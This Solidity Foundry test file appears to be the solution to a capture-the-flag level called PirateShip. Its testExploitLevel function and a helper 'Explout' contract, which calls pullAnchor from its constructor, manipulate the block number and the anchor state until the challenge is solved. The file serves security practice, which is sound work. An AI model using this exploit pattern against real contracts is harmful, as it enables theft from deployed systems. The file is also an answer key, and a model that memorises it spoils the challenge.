// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/15_PirateShip/PirateShip.sol";

// forge test --match-contract PirateShipTest -vvvv
contract PirateShipTest is BaseTest {
    PirateShip instance;

    function setUp() public override {
        super.setUp();
        instance = new PirateShip();
        instance.dropAnchor(block.number + 100001);
        vm.roll(824);
    }

    function testExploitLevel() public {
        vm.roll(824 + 10000001);
        instance.dropAnchor(block.number + 10000001);
        new Explout(instance);
        instance.pullAnchor();
        instance.sailAway();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(instance.blackJackIsHauled() == true, "Solution is not solving the level");
    }
}

contract Explout{
    constructor(PirateShip instance) {
        instance.pullAnchor();
    }
}